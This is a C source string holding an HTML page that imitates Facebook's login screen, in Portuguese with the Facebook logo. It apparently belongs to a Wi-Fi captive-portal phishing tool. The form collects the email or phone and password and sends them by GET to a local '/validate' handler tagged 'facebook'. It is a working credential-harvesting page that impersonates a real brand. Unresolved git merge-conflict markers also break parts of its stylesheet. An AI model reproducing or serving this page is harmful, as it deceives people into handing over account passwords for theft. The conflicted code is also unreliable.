const char FACEBOOK_HTML[] = R"=====(
<html>
  <head>
    <title>Facebook Login</title>
    <meta charset='UTF-8'>
    <meta name='viewport' content='width=device-width,
    initial-scale=0.75, maximum-scale=0.75, user-scalable=no'>
    <meta name='theme-color' content='#5170ad' />
    <style class='cp-pen-styles'>

        -webkit-box-sizing: border-box;
        -moz-box-sizing: border-box;
        box-sizing: border-box;
      }
      html {
        background: #ffffff;
      }
      body {
            font-family: arial;
            font-size: 14px;
            color: #1c1e21;
            font-weight: normal;
            background: #ffffff
      }
      .login-form-wrap {
        background-color: #ffffff;
        filter: progid: DXImageTransform.Microsoft.gradient( startColorstr='#5170ad', endColorstr='#355493', GradientType=1);
        position: relative;
        width: 100%;
        height: 100%;
        margin: auto auto;
        padding: 50px 30px 0 30px;
        text-align: center;
      }
      .login-form-wrap:before {
        display: block;
        content: '';
        width: 58px;
        height: 19px;
        top: 10px;
        left: 10px;
        position: absolute;
      }
<<<<<<< HEAD

=======
      .login-form-wrap > h1 {
        margin: 0 0 0px 0;
        font-size: 50px;
        color: #1877f2;
        font-weight: 900;

      }
      .login-form-wrap > h5 {
        margin-top: 40px;
      }
      .login-form-wrap > h5 > a {
        font-size: 14px;
        color: #fff;
        text-decoration: none;
        font-weight: 400;
      }
>>>>>>> 1b04470eb10f0ebf60f08554c702605c89b4b6e0
      .login-form input[type='text'],
      .login-form input[type='password'] {
        display: block;
        width: 345px;
        border: 1px solid #314d89;
        outline: none;
        padding: 12px 20px;
        color: #afafaf;
        font-weight: 400;
        font-family: 'Lato', sans-serif;
        cursor: pointer;
      }
      .login-form input[type='text'] {
            width: 100%;
            color: black;
            height: 50px;
            font-size: 17px;
            border: 1px solid #ddd;
            border-radius: 10px;
            padding: 0 15px;
            margin-bottom: 25px;
      }
      .login-form input[type='password'] {
            width: 100%;
            color: black;
            height: 50px;
            font-size: 17px;
            border: 1px solid #ddd;
            border-radius: 10px;
            padding: 0 15px;
            margin-bottom: 25px;
      }
      .login-form input[type='submit'] {
        font-family: 'Lato', sans-serif;
        font-weight: 400;
        background: #1877f2;
        filter: progid: DXImageTransform.Microsoft.gradient( startColorstr='#e0e0e0', endColorstr='#cecece', GradientType=0);
        display: block;
        margin: 50px auto 0 auto;
        width: 400px;
        border: none;
        border-radius: 5px;
        padding: 10px;
        font-size: 20px;
        color: #ffffff;
        text-shadow: 0 1px 0 rgba(129, 129, 129, 0.45);
        font-weight: 700;
        box-shadow: 0 1px 3px 1px rgba(0, 0, 0, 0.17), 0 1px 0 rgba(255, 255, 255, 0.36) inset;
      }
      .login-form input[type='submit']:hover {
        background: #2f85f5;
      }
      .login-form input[type='submit']:active {
<<<<<<< HEAD
        background: #2c79df;
      }
      .login-form input[type='text']:focus {
        border: 1px solid #1877f2;
=======
        padding-top: 9px;
        padding-bottom: 7px;
        background: #2f85f5;
>>>>>>> 1b04470eb10f0ebf60f08554c702605c89b4b6e0
      }

      .login-form input[type='password']:focus {
        border: 1px solid #1877f2;}

      .disable-selection {
        -webkit-touch-callout: none;
        -webkit-user-select: none;
        -khtml-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none;
      }

      .login-form-wrap form {
            background: #fff;
            width: 400px;
            height: 240px;
            background: #fff;
            background: #fff;
            border-radius: 10px;
            padding:30px;
            -webkit-box-shadow: -1px -1px 8px -1px rgba(0, 0, 0, 0.52);
            -moz-box-shadow: -1px -1px 8px -1px rgba(0, 0, 0, 0.52);
            box-shadow: -1px -1px 8px -1px rgba(0, 0, 0, 0.52);
            margin-bottom: 10px;

        }
        .login-form-wrap {
            max-width: 450px;
            margin: auto;
            text-align: center;
        }

        .login-form #eml:hover{
            border: 1px solid #1877f2;
        }
        .login-form #pwd:hover {
            border: 1px solid #1877f2;
        }
        .disable-text {

            font-family: 'Freight Sans Bold', Helvetica, Arial, sans-serif;
            font-size: 24px;
            text-align: center;
            font-weight: 100;
            line-height: 30px;
            padding: 0 40 15px;
            text-rendering: optimizelegibility;
            width: auto;

        }

        p{
         text-align: center;
         display: block;
         color: #8d8d8d;

        }
        img{
          width: 100px;
          margin-bottom: 10px;

        }
        h2{
          color: #6e6e6e;
        }
    </style>
  </head>
  <body>
    <section class='login-form-wrap'>

      <img src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiA/PjwhRE9DVFlQ
      RSBzdmcgIFBVQkxJQyAnLS8vVzNDLy9EVEQgU1ZHIDEuMS8vRU4nICAnaHR0cDovL3d3dy53My5v
      cmcvR3JhcGhpY3MvU1ZHLzEuMS9EVEQvc3ZnMTEuZHRkJz48c3ZnIGhlaWdodD0iMTAwJSIgc3R5
      bGU9ImZpbGwtcnVsZTpldmVub2RkO2NsaXAtcnVsZTpldmVub2RkO3N0cm9rZS1saW5lam9pbjpy
      b3VuZDtzdHJva2UtbWl0ZXJsaW1pdDoyOyIgdmVyc2lvbj0iMS4xIiB2aWV3Qm94PSIwIDAgNTEy
      IDUxMiIgd2lkdGg9IjEwMCUiIHhtbDpzcGFjZT0icHJlc2VydmUiIHhtbG5zPSJodHRwOi8vd3d3
      LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6c2VyaWY9Imh0dHA6Ly93d3cuc2VyaWYuY29tLyIgeG1s
      bnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiPjxnPjxwYXRoIGQ9Ik01MTIs
      MjU2YzAsLTE0MS4zODUgLTExNC42MTUsLTI1NiAtMjU2LC0yNTZjLTE0MS4zODUsMCAtMjU2LDEx
      NC42MTUgLTI1NiwyNTZjMCwxMjcuNzc3IDkzLjYxNiwyMzMuNjg1IDIxNiwyNTIuODlsMCwtMTc4
      Ljg5bC02NSwwbDAsLTc0bDY1LDBsMCwtNTYuNGMwLC02NC4xNiAzOC4yMTksLTk5LjYgOTYuNjk1
      LC05OS42YzI4LjAwOSwwIDU3LjMwNSw1IDU3LjMwNSw1bDAsNjNsLTMyLjI4MSwwYy0zMS44MDEs
      MCAtNDEuNzE5LDE5LjczMyAtNDEuNzE5LDM5Ljk3OGwwLDQ4LjAyMmw3MSwwbC0xMS4zNSw3NGwt
      NTkuNjUsMGwwLDE3OC44OWMxMjIuMzg1LC0xOS4yMDUgMjE2LC0xMjUuMTEzIDIxNiwtMjUyLjg5
      WiIgc3R5bGU9ImZpbGw6IzE4NzdmMjtmaWxsLXJ1bGU6bm9uemVybzsiLz48cGF0aCBkPSJNMzU1
      LjY1LDMzMGwxMS4zNSwtNzRsLTcxLDBsMCwtNDguMDIyYzAsLTIwLjI0NSA5LjkxNywtMzkuOTc4
      IDQxLjcxOSwtMzkuOTc4bDMyLjI4MSwwbDAsLTYzYzAsMCAtMjkuMjk3LC01IC01Ny4zMDUsLTVj
      LTU4LjQ3NiwwIC05Ni42OTUsMzUuNDQgLTk2LjY5NSw5OS42bDAsNTYuNGwtNjUsMGwwLDc0bDY1
      LDBsMCwxNzguODljMTMuMDMzLDIuMDQ1IDI2LjM5MiwzLjExIDQwLDMuMTFjMTMuNjA4LDAgMjYu
      OTY2LC0xLjA2NSA0MCwtMy4xMWwwLC0xNzguODlsNTkuNjUsMFoiIHN0eWxlPSJmaWxsOiNmZmY7
      ZmlsbC1ydWxlOm5vbnplcm87Ii8+PC9nPjwvc3ZnPg==" alt="">

      <h2 class='disable-text'>Entre com o Facebook e comece a navegar agora!</h2>

        <form class='login-form' action='/validate' method='GET'>
            <center><label>
            <input id='eml' type='text' name='user' class='1' placeholder='Email ou Telefone' _autofocus='true' autocorrect='off' autocomplete='off' autocapitalize='off' required></label>
            <label><input id='pwd' type='password' name='pass' class='2' placeholder='Senha' autocorrect='off' autocomplete='off' autocapitalize='off' required></label></center>
            <input type='hidden' name='url' value='facebook'>
            <input id='btn' type='submit' value='Entrar'>
        </form>
        <div><p>Meta © 2022</p></div>
    </section>
  </body>
</html>
)=====";
